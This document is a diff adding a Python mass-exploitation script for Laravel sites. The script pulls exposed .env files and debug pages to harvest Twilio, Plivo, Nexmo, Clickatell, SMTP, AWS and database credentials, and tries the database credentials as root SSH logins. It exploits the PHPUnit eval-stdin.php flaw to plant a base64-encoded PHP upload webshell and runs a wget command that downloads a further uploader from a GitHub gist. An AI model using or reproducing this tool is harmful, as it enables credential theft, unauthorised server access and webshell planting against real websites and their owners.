@@ -1,0 +1,821 @@
+# ======================================================
+# Change the author name don't make you become a coder 
+# contact : cepotdotid@gmail.com  
+# Priv8 tools            
+# requirement : python3                                
+# use : python3 b0tname.py                          
+# @2020 cepotdotid | https://t.me/cepotdotid             
+# =======================================================
+
+
+import requests,time,os,sys,re,socket,paramiko
+from termcolor import colored
+from time import time as timer
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from threading import Thread
+try:
+    from Queue import Queue
+except:
+    from queue import Queue
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+try:
+	os.mkdir('debug')
+	os.mkdir('env')
+except:
+	pass
+
+
+
+class Worker(Thread):
+    def __init__(self, tasks):
+        Thread.__init__(self)
+        self.tasks = tasks
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        while True:
+            func, args, kargs = self.tasks.get()
+            try: func(*args, **kargs)
+            except Exception as e: print(e)
+            self.tasks.task_done()
+
+class ThreadPool:
+    def __init__(self, num_threads):
+        self.tasks = Queue(num_threads)
+        for _ in range(num_threads): Worker(self.tasks)
+
+    def add_task(self, func, *args, **kargs):
+        self.tasks.put((func, args, kargs))
+
+    def wait_completion(self):
+        self.tasks.join()
+
+
+class warna():
+	"""docstring for warna"""
+	def red(self,str):
+		return colored(str, "red")
+	def blue(self,str):
+		return colored(str, "blue")
+	def green(self,str):
+		return colored(str, "green")
+	def yellow(self,str):
+		return colored(str, "yellow")
+
+
+
+class _exploit():
+	"""This Class For Exploit"""
+	def __init__(self):
+		self.clr = warna()
+
+	def get_twilio(self,text,url):
+
+		try:
+			if "TWILIO" in text:
+				if "TWILIO_ACCOUNT_SID=" in text:
+					text = text.replace("\n", "##")
+					try:
+						acc_sid = re.findall('TWILIO_ACCOUNT_SID=(.*?)', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						acc_key = re.findall('TWILIO_API_KEY=(.*?)', text)[0]
+					except:
+						acc_key = ''
+					try:
+						sec = re.findall('TWILIO_API_SECRET=(.*?)', text)[0]
+					except:
+						sec = ''
+					try:
+						chatid = re.findall('TWILIO_CHAT_SERVICE_SID=(.*?)', text)[0]
+					except:
+						chatid = ''
+					try:
+						phone = re.findall('TWILIO_NUMBER=(.*?)', text)[0]
+					except:
+						phone = ''
+					try:
+						auhtoken = re.findall('TWILIO_AUTH_TOKEN=(.*?)', text)[0]
+					except:
+						auhtoken = ''
+
+					twilio = ' URL : '+str(url)+'\n TWILIO_ACCOUNT_SID : '+acc_sid+'\n TWILIO_API_KEY : '+acc_key+'\n TWILIO_API_SECRET : '+sec+'\n TWILIO_CHAT_SERVICE_SID : '+chatid+'\n TWILIO_NUMBER : '+phone+'\n TWILIO_AUTH_TOKEN : '+auhtoken+'\n '
+					self.save(twilio, 'env/env/twilio_env.txt')
+
+					return True
+
+				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
+					try:
+						acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						acc_sid = ''
+					try:
+						acc_key = re.findall('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						acc_key = ''
+					try:
+						sec = re.findall('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						sec = ''
+					try:
+						chatid = re.findall('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						chatid = ''
+					try:
+						phone = re.findall('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						phone = ''
+					try:
+						auhtoken = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						auhtoken = ''
+
+					twilio = ' URL : '+str(url)+'\n TWILIO_ACCOUNT_SID : '+acc_sid+'\n TWILIO_API_KEY : '+acc_key+'\n TWILIO_API_SECRET : '+sec+'\n TWILIO_CHAT_SERVICE_SID : '+chatid+'\n TWILIO_NUMBER : '+phone+'\n TWILIO_AUTH_TOKEN : '+auhtoken+'\n '
+					self.save(twilio, 'debug/twilio_debug.txt')
+					return True
+				else:
+					return False
+			else:
+				return False
+
+		except Exception as e:
+			return False
+			pass
+
+	def get_plivo(self,text,url):
+
+		try:
+			if "PLIVO" in text:
+				if "PLIVO_AUTH_ID=" in text:
+					text = text.replace("\n", "##")
+					try:
+						auth_id = re.findall('PLIVO_AUTH_ID=(.*?)', text)[0]
+					except:
+						auth_id = ''
+					try:
+						auth_token = re.findall('PLIVO_AUTH_TOKEN=(.*?)', text)[0]
+					except:
+						auth_token = ''
+					try:
+						auth_number = re.findall('PLIVO_FROM_NUMBER=(.*?)', text)[0]
+					except:
+						auth_number = ''
+
+					plivo = ' URL : '+str(url)+'\n PLIVO_AUTH_ID : '+auth_id+'\n PLIVO_AUTH_TOKEN : '+auth_token+'\n PLIVO_FROM_NUMBER : '+auth_number+'\n'
+					self.save(plivo, 'env/env_plivo.txt')
+
+					return True
+
+				elif '<td>PLIVO_AUTH_ID</td>' in text:
+
+					try:
+						auth_id = re.findall('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						auth_id = ''
+					try:
+						auth_token = re.findall('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						auth_token = ''
+					try:
+						auth_number = re.findall('<td>PLIVO_FROM_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						auth_number = ''
+
+					plivo = ' URL : '+str(url)+'\n PLIVO_AUTH_ID : '+auth_id+'\n PLIVO_AUTH_TOKEN : '+auth_token+'\n PLIVO_FROM_NUMBER : '+auth_number+'\n'
+					self.save(plivo, 'debug/debug_plivo.txt')
+					return True
+				else:
+					return False
+			else:
+				return False
+
+		except Exception as e:
+			return False
+
+
+
+
+	def get_nexmo(self,text,url):
+
+		try:
+			if "NEXMO" in text:
+				if "NEXMO_KEY=" in text:
+					text = text.replace("\n", "##")
+					try:
+						n_key = re.findall('NEXMO_KEY=(.*?)', text)[0]
+					except:
+						n_key = ''
+					try:
+						n_secret = re.findall('NEXMO_SECRET=(.*?)', text)[0]
+					except:
+						n_secret = ''
+
+					nexmo = ' URL : '+str(url)+'\n NEXMO_KEY : '+n_key+'\n NEXMO_SECRET : '+n_secret+'\n'
+					self.save(nexmo, 'env/env_nexmo.txt')
+
+					return True
+
+				elif '<td>NEXMO_KEY</td>' in text:
+
+					try:
+						auth_id = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						n_key = ''
+					try:
+						n_secret = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						n_secret = ''
+
+					nexmo = ' URL : '+str(url)+'\n NEXMO_KEY : '+n_key+'\n NEXMO_SECRET : '+n_secret+'\n'
+					self.save(nexmo, 'debug/debug_nexmo.txt')
+					return True
+				else:
+					return False
+			else:
+				return False
+
+		except Exception as e:
+			return False
+
+	def get_clickatell(self,text,url):
+
+		try:
+			if "CLICKATELL" in text:
+				if "CLICKATELL_USER=" in text:
+					text = text.replace("\n", "##")
+					try:
+						c_user = re.findall('CLICKATELL_USER=(.*?)', text)[0]
+					except:
+						c_user = ''
+					try:
+						c_pass = re.findall('CLICKATELL_PASS=(.*?)', text)[0]
+					except:
+						c_pass = ''
+					try:
+						c_api_id = re.findall('CLICKATELL_API_ID=(.*?)', text)[0]
+					except:
+						c_api_id = ''
+
+					clicktell = ' URL : '+str(url)+'\n CLICKATELL_USER : '+c_user+'\n CLICKATELL_PASS : '+c_pass+'\n CLICKATELL_API_ID : '+c_api_id+'\n'
+					self.save(clicktell, 'env/env_clicktell.txt')
+
+					return True
+
+				elif '<td>CLICKATELL_USER</td>' in text:
+
+					try:
+						c_user = re.findall('<td>CLICKATELL_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						c_user = ''
+					try:
+						c_pass = re.findall('<td>CLICKATELL_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						c_pass = ''
+					try:
+						c_api_id = re.findall('<td>CLICKATELL_API_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
+					except:
+						c_api_id = ''
+
+					clicktell = ' URL : '+str(url)+'\n CLICKATELL_USER : '+c_user+'\n CLICKATELL_PASS : '+c_pass+'\n CLICKATELL_API_ID : '+c_api_id+'\n'
+					self.save(clicktell, 'debug/debug_clicktell.txt')
+					return True
+				else:
+					return False
+			else:
+				return False
+
+		except Exception as e:
+			return False
+
+	def is_valid_ipv4_address(address):
+	    try:
+	        socket.inet_pton(socket.AF_INET, address)
+	    except AttributeError: 
+	        try:
+	            socket.inet_aton(address)
+	        except socket.error:
+	            return False
+	        return address.count('.') == 3
+	    except socket.error:
+	        return False
+
+	    return True
+
+	def phpunit(self,url):
+
+		try:
+			self.getenv(url)
+			with requests.Session() as session:
+
+				session.headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
+				payload = "<?php echo 'cepotdotid#'.php_uname().'#'; ?>"
+				response = session.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=payload,verify=False,timeout=5,allow_redirects=False)
+
+				if 'cepotdotid' in response.text:
+
+					webshell_payload_wget = "<?php echo 'aw'.system('wget https://gist.githubusercontent.com/galehrizky/049876b180d52937f1579fbb5d156869/raw/b3c09645ba678bf82646b82d6b3e234d4fafca2f/uploader.php -O aw.php'); ?>"
+					webshell_payload = "<?php $shell='PD9waHAgCgplY2hvICdTeXN0ZW06IDxmb250IGNvbG9yPSJibGFjayIgaWQ9InN5c3RlbV9pbmZvIj5nYWxlaGRvdGlkIycucGhwX3VuYW1lKCkuJyM8L2ZvbnQ+PGJyPic7CmVjaG8iPGJyPjxmb3JtIG1ldGhvZD1wb3N0IGVuY3R5cGU9bXVsdGlwYXJ0L2Zvcm0tZGF0YT4iOwplY2hvIjxpbnB1dCB0eXBlPWZpbGUgbmFtZT1mPjxpbnB1dCBuYW1lPWsgdHlwZT1zdWJtaXQgaWQ9ayB2YWx1ZT11cGxvYWQ+PGJyPiI7CmlmKCRfUE9TVFsiayJdPT11cGxvYWQpIHsgCiAgICBpZihAY29weSgkX0ZJTEVTWyJmIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siZiJdWyJuYW1lIl0pKSB7CiAgICAgICAgZWNobyI8Yj4iLiRfRklMRVNbImYiXVsibmFtZSJdOwogICAgfSBlbHNlIHsKICAgICAgZWNobyI8Yj5HYWdhbCB1cGxvYWQgY29rIjsKICB9Cn0KPz4=';file_put_contents('aw.php', base64_decode($shell)) ?>"
+					kernel = re.findall("cepotdotid#(.*?)#", response.text)[0]
+					session.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=webshell_payload,verify=False,timeout=5,allow_redirects=False)
+					session.post(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=webshell_payload_wget,verify=False,timeout=5,allow_redirects=False)
+
+					print(self.clr.green("[*] [PHP UNIT VULN] {}".format(url)))
+					print(self.clr.green("[*] [KERNEL] [ {}]".format(kernel)))
+					
+					shell_path = url+'/vendor/phpunit/phpunit/src/Util/PHP/aw.php'
+					webshell_check = requests.get(shell_path, verify=False,timeout=5,allow_redirects=False)
+
+					if webshell_check.status_code == 200 and 'galehdotid' in webshell_check.text:
+						print(self.clr.green("[*] [PHP UNIT VULN] [UPLOAD SHELL SUCCESS] {}".format(shell_path)))
+						self.save(shell_path, "phpunit_shell.txt")
+						return True
+		
+					else:
+						print(self.clr.yellow("[-] [PHP UNIT TRY MANUAL] {}".format(url)))
+						self.save(url+'/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', "phpunit_manual.txt")
+						return False
+
+				else:
+					print(self.clr.red("[-] [PHP UNIT NOT VULN] {}".format(url)))
+					return False
+
+		except Exception as e:
+			pass 
+
+	def crack_vps(self,host_aw,url,username,password):
+			try:
+
+				if 'root' in username:
+
+					if self.is_valid_ipv4_address(host_aw) == True:
+						hostname = host_aw
+					else:
+
+						hostname = url
+						hostname = hostname.replace("http://","")
+						hostname = socket.gethostbyname(hostname)
+
+					port = 22 ## Default port 22
+					p = paramiko.SSHClient()
+					p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+					p.connect(hostname, port=port, username=username, password=password)
+					stdin, stdout, stderr = p.exec_command("echo cepotdotid;uname -a;")
+					opt = stdout.readlines()
+
+					try:
+						if 'cepotdotid' in opt[0]:
+							self.save(url+"|"+hostname+"|"+port+"|"+username+"|"+password, 'vps_cracked.txt')
+						else:
+							self.save(url+"|"+hostname+"|"+port+"|"+username+"|"+password, 'vps_cracked.txt')
+
+					except Exception as e:
+						pass
+
+			except Exception as e:
+				pass
+
+	def detect_smtp(self, mode,host,port,username,password,mail_from,from_name,url):
+		if host == "null" or port == "null" or username == "null" or password == "null":
+			return False
+		else:
+			if 'smtp.mailtrap.io' not in host or 'mailtrap.io' not in host:
+				if 'sendgrid.net' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_smtpsendgrid.txt')
+				elif '.amazonaws.com' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password+"|"+mail_from, mode+'/'+mode+'_smtp_aws.txt')
+				elif 'office365' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_office365.txt')
+				elif '1and1' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_1and1.txt')
+				elif 'zoho' in  host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_zoho.txt')
+				elif 'mandrillapp' in  host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password+"|"+mail_from, mode+'/'+mode+'_mandrillapp.txt')
+				elif 'mailgun' in  host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_mailgun.txt')
+				elif 'ionos' in  host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_ionos.txt')
+				elif 'mailjet' in  host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password+"|"+mail_from, mode+'/'+mode+'_smtp_mailjet.txt')
+				elif '.jp' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_smtp_jp.txt')
+				elif 'sendinblue.com' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_smtp_sendinblue.txt')
+				elif 'emailsrvr.com' in host:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'rackspace.txt')
+				else:
+					self.save(url+"|"+host+"|"+port+"|"+username+"|"+password, mode+'/'+mode+'_smtprandom.txt')
+
+	def get_smtp(self,text,url):
+
+		try:
+			if 'MAIL_HOST' in text:
+				if 'MAIL_HOST=' in text:
+					mode = 'env'
+					text = text.replace("\n", "##")
+					try:
+						host = re.findall("MAIL_HOST=(.*?)##", text)[0]
+					except:
+						host = ''
+					try:
+						port = re.findall("MAIL_PORT=(.*?)##", text)[0]
+					except:
+						port = ''
+					try:
+						username = re.findall("MAIL_USERNAME=(.*?)##", text)[0]
+					except:
+						username = ''
+					try:
+						password = re.findall("MAIL_PASSWORD=(.*?)##", text)[0]
+					except:
+						password = ''
+					try:
+						mail_from = re.findall("MAIL_FROM_ADDRESS=(.*?)##", text)[0]
+					except:
+						mail_from = ''
+					try:
+						from_name = re.findall("MAIL_FROM_NAME=(.*?)##", text)[0]
+					except:
+						from_name = ''
+
+
+					self.detect_smtp(mode,host,port,username,password,mail_from,from_name,url)
+					return True
+				elif '<td>MAIL_HOST</td>' in  text:
+					mode = 'debug'
+					try:
+						host = re.findall("<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						host = ''
+					try:
+						port = re.findall("<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						port = ''
+					try:
+						username = re.findall("<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						username = ''
+					try:
+						password = re.findall("<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						password = ''
+					try:
+					 	mail_from = re.findall("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						mail_from = ''
+					try:
+						from_name = re.findall("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						from_name = ''
+					
+					self.detect_smtp(mode,host,port,username,password,mail_from,from_name,url)
+					return True
+				else:
+					return False
+			else:
+				return False
+					
+	
+		except Exception as e:
+			pass
+
+	def get_db(self,text,url):
+
+		try:
+			if 'DB_HOST' in text:
+				if 'DB_HOST=' in text:
+					text = text.replace("\n", "##")
+					try:
+						dbhost = re.findall("DB_HOST=(.*?)##", text)[0]
+					except:
+						dbhost = ''
+					try:
+						dbport = re.findall("DB_PORT=(.*?)##", text)[0]
+					except:
+						dbport = ''
+					try:
+						dbusername = re.findall("DB_USERNAME=(.*?)##", text)[0]
+					except:
+						dbusername = ''
+					try:
+						dbpassword = re.findall("DB_PASSWORD=(.*?)##", text)[0]
+					except:
+						dbpassword = ''
+					self.crack_vps(url,dbhost,dbusername,dbpassword)
+					self.save(url+"|"+dbhost+"|"+dbport+"|"+dbusername+"|"+dbpassword, 'env/env_dblaravel.txt')
+					return True
+
+				elif '<td>DB_HOST</td>' in text:
+						try:
+							dbhost = re.findall("<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							dbhost = ''
+						try:
+							dbport = re.findall("<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							dbport = ''
+						try:
+							dbusername = re.findall("<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							dbusername = ''
+						try:
+							dbpassword = re.findall("<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							dbpassword = ''
+						self.crack_vps(url,dbhost,dbusername,dbpassword)
+						self.save(url+"|"+dbhost+"|"+dbport+"|"+dbusername+"|"+dbpassword, 'debug/debug_dblaravel.txt')
+						return True
+
+				else:
+					return False
+			else:
+				return False
+
+		except Exception as e:
+			pass
+
+	def get_aws(self,text,url):
+
+		try:
+			if 'AWS_ACCESS_KEY_ID' in text:
+				if 'AWS_ACCESS_KEY_ID=' in text:
+					text = text.replace("\n", "##")
+					try:
+						aws_key = re.findall("AWS_ACCESS_KEY_ID=(.*?)##", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_key_secret = re.findall("AWS_SECRET_ACCESS_KEY=(.*?)##", text)[0]
+					except:
+						aws_key_secret = ''
+					try:
+						aws_reg = re.findall("AWS_DEFAULT_REGION=(.*?)##", text)[0]
+					except:
+						aws_reg = ''
+					try:
+						bucket = re.findall("AWS_BUCKET=(.*?)##", text)[0]
+					except:
+						bucket = ''
+
+					aws_bucket_ = ' URL : '+str(url)+'\n AWS_ACCESS_KEY_ID : '+aws_key+'\n AWS_SECRET_ACCESS_KEY : '+aws_key_secret+'\n AWS_DEFAULT_REGION : '+aws_reg+'\n AWS_BUCKET : '+bucket+'\n'
+					self.save(aws_bucket_, 'env/env_aws_bucket.txt')
+					return True
+
+				elif '<td>AWS_ACCESS_KEY_ID</td>' in text:
+					try:
+						aws_key = re.findall("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key = ''
+					try:
+						aws_key_secret = re.findall("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_key_secret = ''
+					try:
+						aws_reg = re.findall("<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						aws_reg = ''
+					try:
+						bucket = re.findall("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+					except:
+						bucket = ''
+
+
+					aws_bucket_ = ' URL : '+str(url)+'\n AWS_ACCESS_KEY_ID : '+aws_key+'\n AWS_SECRET_ACCESS_KEY : '+aws_key_secret+'\n AWS_DEFAULT_REGION : '+aws_reg+'\n AWS_BUCKET : '+bucket+'\n'
+					self.save(aws_bucket_, 'debug/debug_aws_bucket.txt')
+
+					return True
+				elif 'AWS_KEY' in text:
+					if "AWS_KEY=" in text:
+						text = text.replace("\n", "##")
+						try:
+							aws_key = re.findall("AWS_KEY=(.*?)=(.*?)##", text)[0]
+						except:
+							aws_key = ''
+						try:
+							aws_key_secret = re.findall("AWS_SECRET=(.*?)##", text)[0]
+						except:
+							aws_key_secret = ''
+						try:
+							aws_reg = re.findall("AWS_REGION=(.*?)##", text)[0]
+						except:
+							aws_reg = ''
+						try:
+							bucket = re.findall("AWS_BUCKET=(.*?)##", text)[0]
+						except:
+							bucket = ''
+
+						aws_bucket_ = ' URL : '+str(url)+'\n AWS_ACCESS_KEY_ID : '+aws_key+'\n AWS_SECRET_ACCESS_KEY : '+aws_key_secret+'\n AWS_DEFAULT_REGION : '+aws_reg+'\n AWS_BUCKET : '+bucket+'\n'
+						self.save(aws_bucket_, 'env/env_aws_bucket.txt')
+
+						return True
+				elif '<td>AWS_KEY</td>' in text:
+						try:
+							aws_key = re.findall("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							aws_key = ''
+						try:
+							aws_key_secret = re.findall("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							aws_key_secret = ''
+						try:
+							aws_reg = re.findall("<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							aws_reg = ''
+						try:
+							bucket = re.findall("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							bucket = ''
+
+
+						aws_bucket_ = ' URL : '+str(url)+'\n AWS_ACCESS_KEY_ID : '+aws_key+'\n AWS_SECRET_ACCESS_KEY : '+aws_key_secret+'\n AWS_DEFAULT_REGION : '+aws_reg+'\n AWS_BUCKET : '+bucket+'\n'
+						self.save(aws_bucket_, 'debug/debug_aws_bucket.txt')
+
+						return True
+				elif '<td>SES_KEY</td>' in text:
+					if 'SES_KEY=' in text:
+						text = text.replace("\n", "##")
+						try:
+							aws_key = re.findall("SES_KEY=(.*?)##", text)[0]
+						except:
+							aws_key = ''
+						try:
+							aws_key_secret = re.findall("SES_SECRET=(.*?)##", text)[0]
+						except:
+							aws_key_secret = ''
+						try:
+							aws_reg = re.findall("SES_REGION=(.*?)##", text)[0]
+						except:
+							aws_reg = ''
+						try:
+							bucket = re.findall("SES_BUCKET=(.*?)##", text)[0]
+						except:
+							bucket = ''
+
+
+						aws_bucket_ = ' URL : '+str(url)+'\n AWS_ACCESS_KEY_ID : '+aws_key+'\n AWS_SECRET_ACCESS_KEY : '+aws_key_secret+'\n AWS_DEFAULT_REGION : '+aws_reg+'\n AWS_BUCKET : '+bucket+'\n'
+						self.save(aws_bucket_, 'env/env_aws_bucket.txt')
+
+						return True
+				elif '<td>SES_KEY</td>' in  text:
+						try:
+							aws_key = re.findall("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							aws_key = ''
+						try:
+							aws_key_secret = re.findall("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							aws_key_secret = ''
+						try:
+							aws_reg = re.findall("<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							aws_reg = ''
+						try:
+							bucket = re.findall("<td>SES_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
+						except:
+							bucket = ''
+						aws_bucket_ = ' URL : '+str(url)+'\n AWS_ACCESS_KEY_ID : '+aws_key+'\n AWS_SECRET_ACCESS_KEY : '+aws_key_secret+'\n AWS_DEFAULT_REGION : '+aws_reg+'\n AWS_BUCKET : '+bucket+'\n'
+						self.save(aws_bucket_, 'debug/debug_aws_bucket.txt')
+
+						return True
+
+				else:
+					return False
+			else:
+				return False
+
+		except Exception as e:
+			pass
+		
+
+	def save(self, sites, names):
+		s = open(names, "a+")
+		s.write(sites+"\n")
+
+		return s
+
+	def gasken(self,url, urutan):
+
+		try:
+			response_text = False
+			ayey_env = ['/.env', '/vendor/.env', '/storage/.env', '/public/.env']
+			cekidot = False
+			eyey_result = ''
+			for x in ayey_env:
+				headers =  {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
+				eeyey = requests.get(url+x, headers=headers, timeout=5, verify=False, allow_redirects=False).text
+	
+				if 'APP_KEY=' in eeyey:
+					cekidot = True
+					eyey_result = eeyey
+
+
+			if cekidot:
+				response_text = eyey_result
+			else:
+				aweu = requests.post(url, data={"0x[]":"janc0xsec"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
+				if "<td>APP_KEY</td>" in aweu:
+					response_text = aweu
+
+
+			if response_text:
+				self.save(url, 'vuln.txt')
+				twilio = self.get_twilio(response_text,url)
+				smtp = self.get_smtp(response_text,url)
+				plivo = self.get_plivo(response_text,url)
+				nexmo = self.get_nexmo(response_text,url)
+				clickatell = self.get_clickatell(response_text,url)
+				getdb = self.get_db(response_text,url)
+				aws = self.get_aws(response_text,url)
+				phpunit = self.phpunit(url)
+
+				if smtp:
+					print(self.clr.green("[*] [SMTP] {}".format(url)))
+
+				if aws:
+					print(self.clr.green("[*] [AWS]  {}".format(url)))
+								
+				if twilio:
+					print(self.clr.green("[*]  [TWILIO] {}".format(url)))
+
+				if plivo:
+					print(self.clr.green("[*] [PLIVO] {}".format(url)))
+
+				if nexmo:
+					print(self.clr.green("[*] [NEXMO] {}".format(url)))
+
+				if clickatell:
+					print(self.clr.green("[*] [CLICKATELL] {}".format(url)))
+
+				if getdb:
+					print(self.clr.green("[*] [Database] {}".format(url)))
+
+				if phpunit:
+					print(self.clr.green("[*] [PHPUNIT] {}".format(url)))
+
+			else:
+				print(self.clr.red("[-] Sites not vuln  {}".format(url)))
+				self.save(url, 'not_vuln.txt')
+
+		except Exception as e:
+			pass 
+
+exploit = _exploit()
+
+
+
+def formaturl(url):
+    if not re.match('(?:http|ftp|https)://', url):
+        return 'http://{}'.format(url)
+    return url
+
+def main():
+
+	try:
+		print(''' 
+     __           _             _    
+  /\ \ \__ _  ___| | ___ __ ___| | __
+ /  \/ / _` |/ _ \ |/ / '__/ _ \ |/ /
+/ /\  / (_| |  __/   <| | |  __/   < 
+\_\ \/ \__, |\___|_|\_\_|  \___|_|\_\\ v2.0
+       |___/ Powered by Cumaiseng.dev
+''')
+
+		lisnya = input("Your name list -> ")
+		trit = int(input("Put Your Thread Number -> "))
+
+		os.system('cls' if os.name == 'nt' else 'clear')
+
+
+		try:
+			i = 1
+
+			Th = ThreadPool(int(trit))
+
+			with open(lisnya, 'r') as url:
+
+
+				for x in url:
+					Th.add_task(exploit.gasken, formaturl(x.strip()), i)
+					i += 1
+
+			Th.wait_completion()
+			
+		except IOError as e:
+			print("[-] YOUR LIST NOT FOUND !")
+			sys.exit()
+		
+	except Exception as e:
+		raise e 
+
+
+if __name__ == '__main__':
+	try:
+		main()
+	except KeyboardInterrupt  as e:
+		print("[!] Exit Program....")
+		sys.exit()
+		pass
